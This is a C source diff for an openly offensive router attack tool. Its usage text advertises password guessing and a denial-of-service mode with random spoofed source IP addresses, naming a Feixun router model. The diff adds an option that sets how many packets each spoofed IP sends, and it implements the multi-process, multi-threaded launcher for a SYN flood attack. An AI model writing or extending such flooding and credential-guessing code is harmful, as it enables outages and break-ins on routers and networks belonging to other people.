@@ -41,14 +41,16 @@ static int DisplayUsage(void)
                   "         -p    Set the process number (default 4)\n"
                   "         -t    Set the thread number (default 2)\n"
                   "         -i    Indicate intent URL address (user shoud indicate the port in thr URL)\n"
-                  "         -R    Use the random source IP address in dos attack (can not use in the guess password attack)\n"
-                  "               0    turn off the random source ip address which can protect in the local net\n"
-                  "               1    enable random source ip address (default)\n\n"
                   "         -m    Type of router\n"
-                  "               feixun_fwr_604h not_sure\n\n"
+                  "               feixun_fwr_604h .etc\n\n"
                   "         -h    Show this message\n\n"
                   "         --get-response-length    Get the response length for test\n"
-                  "         --set-watch-length       Indicate a length, if response's length not equal this, return";
+                  "         --set-watch-length       Indicate a length, if response's length not equal this, return"
+                  "         -R    Use the random source IP address in dos attack (can not use in the guess password attack)\n"
+                  "               0    turn off the random source ip address which can protect you true IP in the local net\n"
+                  "               1    enable random source ip address (default)\n\n"
+                  "         --ip-repeat-time         if you use the -R, indicate the each random ip repeat send times(default 1024)\n"
+                  "";
 
     printf("%s", usage);
     return 0;
@@ -126,6 +128,18 @@ static int ProcessInput(const int argc, char *argv[], pInput input)
                 else
                 {
                     DisplayError("Can not found value of --set-watch-length parameter");
+                    return -1;
+                }
+            }
+            else if (strstr(ptmp2, "ip-repeat-time"))
+            {
+                if (argv[++i])
+                {
+                    input->each_ip_repeat = atoi(argv[i]);
+                }
+                else
+                {
+                    DisplayError("Can not found value of --ip-repeat-time parameter");
                     return -1;
                 }
             }
@@ -348,6 +362,69 @@ static int ProcessInput(const int argc, char *argv[], pInput input)
 static int StartSYNFlood(pInput input)
 {
     // run function in thread
+    extern int SYNFloodAttack(pInput input);
+
+    pid_t pid, wpid;
+    pthread_t tid[input->max_thread];
+    pthread_attr_t attr;
+    int i, j, ret;
+    int status = 0;
+
+    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFlood");
+
+    for (i = 0; i < input->max_process; i++)
+    {
+        pid = fork();
+        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "pid: %d", pid);
+        if (pid == 0)
+        {
+            // child process
+            for (j = 0; j < input->max_thread; j++)
+            {
+                //input->serial_num = (i * input->max_thread) + j;
+                if (pthread_attr_init(&attr))
+                {
+                    DisplayError("StartGuess pthread_attr_init failed");
+                    return -1;
+                }
+                //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
+                if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
+                {
+                    DisplayError("StartGuess pthread_attr_setdetachstate failed");
+                    return -1;
+                }
+                // create thread
+                ret = pthread_create(&tid[j], &attr, (void *)SYN_FLOOD_ATTACK, input);
+                //printf("j is: %d\n", j);
+                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
+                // here we make a map
+                if (ret != 0)
+                {
+                    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
+                    DisplayError("Create pthread failed");
+                    return -1;
+                }
+                pthread_attr_destroy(&attr);
+            }
+            //pthread_detach(tid);
+            // join them all
+            for (j = 0; j < input->max_thread; j++)
+            {
+                pthread_join(tid[j], NULL);
+            }
+        }
+        else if (pid < 0)
+        {
+            // Error now
+            DisplayError("Create process failed");
+        }
+        // Father process
+        while ((wpid = wait(&status)) > 0)
+        {
+            // nothing here
+            // wait the child process end
+        }
+    }
     return 0;
 }
 
@@ -528,6 +605,7 @@ static int InitInput(pInput *p)
     (*p)->random_password_length = RANDOM_PASSWORD_LENGTH_DEFAULT;
     (*p)->random_sip_address = RANDOM_SIP_DEFAULT;
     (*p)->watch_length = 0;
+    (*p)->each_ip_repeat = EACH_IP_REPEAT_TIME;
     if (!strncpy((*p)->username, (char *)USERNAME_DEFAULT, strlen((char *)USERNAME_DEFAULT)))
     {
         DisplayError("Init input strncpy failed");
